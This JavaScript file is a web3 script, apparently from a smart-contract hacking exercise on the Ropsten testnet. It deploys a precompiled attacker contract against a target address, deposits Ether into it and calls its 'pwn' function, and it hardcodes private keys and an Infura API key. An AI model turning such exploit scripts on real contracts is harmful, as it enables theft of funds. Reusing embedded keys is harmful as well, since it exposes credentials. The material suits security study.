const Web3 = require('web3');
const EthereumTx = require('ethereumjs-tx').Transaction
const fs = require('fs')
const solc = require('solc')

const LOCAL = false
let GAS_PRICE = 0.8 * 1e9

let provider = null
let contract_address = null
let privateKey = null;

let abi = null 



if (LOCAL) {
    provider = "http://127.0.0.1:7545"
    target_contract_address = '0xC48D3849546EBb3a1252a1a9461AC2c620EE77e0'
    // abi = require('../build/contracts/CoinFlip.json').abi
    privateKey = '0x618fd34a529886db15375bc6ae2ec683263446caf836d5fb717c9345fe859e69'
} else {
    provider = "wss://ropsten.infura.io/ws/v3/5f65182f06a14f5182a2e9af8d8fff33"//"https://ropsten.infura.io/v3/5f65182f06a14f5182a2e9af8d8fff33"
    target_contract_address = "0x002Ef1AC98b63A3ab50e5E655AfB605111441e78"
    // abi = [{"inputs":[{"internalType":"address","name":"_owner","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pwn","outputs":[],"stateMutability":"nonpayable","type":"function"}]
    privateKey = '0x2F2C0F3E2F1CDF05D644104C7DE20A5C5642024308500954A92FE2BA83F49068'
}




const w3 = new Web3(provider); // 'ws://localhost:8546'


// const input = fs.readFileSync('./delme.sol');
// const output = solc.compile(input);
// console.log(output)
// const bytecode = output.contracts['Hacker'].bytecode;
// abi = JSON.parse(output.contracts['Hacker'].interface);

const bytecode = '608060405234801561001057600080fd5b506040516102dd3803806102dd8339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610249806100946000396000f3fe6080604052600436106100435760003560e01c8063b69ef8a8146100bf578063d0e30db0146100ea578063d4b83992146100f4578063dd365b8b1461014b57610044565b5b34801561005057600080fd5b506040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260148152602001807f48616861206b65657020746865206368616e676500000000000000000000000081525060200191505060405180910390fd5b3480156100cb57600080fd5b506100d4610162565b6040518082815260200191505060405180910390f35b6100f2610168565b005b34801561010057600080fd5b5061010961017a565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561015757600080fd5b5061016061019f565b005b60015481565b34600160008282540192505081905550565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc6001549081150290604051600060405180830381858888f19350505050158015610208573d6000803e3d6000fd5b50600060018190555056fea2646970667358221220a17e74dabd3baeea96c64f5c0d09811558b98f99af9d0d1f9ea291618e8e560464736f6c63430006060033'
abi = [{"inputs":[{"internalType":"address payable","name":"_target","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"stateMutability":"nonpayable","type":"fallback"},{"inputs":[],"name":"balance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"deposit","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"pwn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"target","outputs":[{"internalType":"address payable","name":"","type":"address"}],"stateMutability":"view","type":"function"}]

// Contract object
const a = w3.eth.accounts.privateKeyToAccount(privateKey);

const c = new w3.eth.Contract(abi, {
    data: '0x' + bytecode,
    from: a.address,
    gas: 90000*2
});






// (async () => {
//     GAS_PRICE = await w3.eth.getGasPrice()
//     console.log(await wins());
//     console.log('Account ->', a);
//     w3.eth.subscribe('newBlockHeaders', () => {
//         console.log('  NEW BLOCK! ')
//     });

//     await win_once()
//     // await flip(true).then(r => {console.log(r);});
// })()

(async () => {
    GAS_PRICE = await w3.eth.getGasPrice();
    
    // ------------- Stage 1
    
    let data = c.deploy({arguments: [target_contract_address]}).encodeABI()
    let signed_tx = await makeTransaction(a.privateKey.substr(2), {data: data, from: a.address})
    console.log('Sending 1')
    let result = await w3.eth.sendSignedTransaction(signed_tx)
    const hackerAddress = result.contractAddress;
    console.log('Sent 1', hackerAddress)

    // const hackerAddress = '0x2C4aFE3fc6b3aE914dc27F9eA18F0AdF2e875927'

    // ------------- Stage 2

    data = c.methods.deposit().encodeABI();
    signed_tx = await makeTransaction(a.privateKey.substr(2), {data: data, value: 0.0001, to: hackerAddress, from: a.address})

    console.log('Sending 2')
    result = await w3.eth.sendSignedTransaction(signed_tx)
    console.log('Sent 2')


    // TODO check balance



    // ------------- Stage 3

    data = c.methods.pwn().encodeABI();
    signed_tx = await makeTransaction(a.privateKey.substr(2), {data: data, to: hackerAddress, from: a.address})

    console.log('Sending 3')
    result = await w3.eth.sendSignedTransaction(signed_tx)
    console.log('Sent 3')
    // w3.eth.subscribe('newBlockHeaders', async () => {
    //     const w = await wins();
    //     console.log(`  NEW BLOCK! `);
    //     console.log('wins:', w);
    //     if (w >= 10) {
    //         w3.eth.clearSubscriptions()
    //         return 0
    //     } else {
    //         nonce ++;
    //         await win_once(nonce);
    //     }
    // });

    // let max_collected = 0

    // let w = await wins();

    // while ( w < 10 ) {
    //     try {
    //         await win_once();
    //         w = await wins()
    //         if (w > max_collected) max_collected = w
    //         console.log(`(${(new Date()).toISOString()})   --   wins: ${w} | max: ${max_collected}|`)
    //     } catch(e) {
    //         console.log('Oooops, some error')
    //     }
    // }
})()



async function makeTransaction(privateKey, options) {
    const gasLimit = 3000000;
    const nonce = await w3.eth.getTransactionCount(a.address)
    console.log('Nonce:', nonce)
    const rawTransaction = Object.assign({
        "nonce": int2hex(nonce),
        "gasPrice": int2hex(GAS_PRICE),
        "gasLimit": int2hex(gasLimit),
        // "to": c._address,
        // "value": "0x00",
        // "data": data,
        // "chainId": 4 //change the chainID accordingly
    }, options);

    // console.log(rawTransaction)

    const tx = new EthereumTx(rawTransaction, {'chain':'ropsten'});
    privateKey = Buffer.from(privateKey, 'hex') 
    tx.sign(privateKey);

    const serializedTx = tx.serialize();
    return `0x${serializedTx.toString('hex')}`
}


function int2hex(v) {
    return '0x' + v.toString(16)
}

function hex2int(v) {
    return parseInt(v, 'hex')
}

function str2hex(v) {
    return '0x' + Buffer.from(v, 'utf8').toString('hex');
}






async function flip(side, options={}) {
    const gasLimit = 3000000;
    const data = c.methods.flip(side).encodeABI(); // abi encoded request to the contract

    const rawTransaction = {
        "nonce": options.nonce && options.nonce >= 0 ? options.nonce : int2hex(await w3.eth.getTransactionCount(a.address)),
        "gasPrice": int2hex(GAS_PRICE),
        "gasLimit": int2hex(gasLimit),
        "to": c._address,
        "value": "0x00",
        "data": data,
        // "chainId": 4 //change the chainID accordingly
    };

    // console.log(rawTransaction)

    const tx = new EthereumTx(rawTransaction, {'chain':'ropsten'});
    const privateKey = Buffer.from(a.privateKey.substr(2), 'hex') 
    tx.sign(privateKey);

    const serializedTx = tx.serialize();
    return w3.eth.sendSignedTransaction('0x' + serializedTx.toString('hex'))
    // .once('transactionHash', function(hash){ ... })
    // .once('receipt', function(receipt){ ... })
    // .on('confirmation', function(confNumber, receipt){ ... })
    // .on('error', function(error){ ... })
    // .then(function(receipt){
    //     // will be fired once the receipt is mined
    // });
}

async function dev_get_ith_last_block_and_hash(block_number=0) {
    if (block_number <= 0) {
        block_number = await w3.eth.getBlockNumber() + block_number
    }
    const block_hash = (await w3.eth.getBlock(block_number)).hash
    return {block_number, block_hash, block_hash_uint: parseInt(block_hash, 0)}
}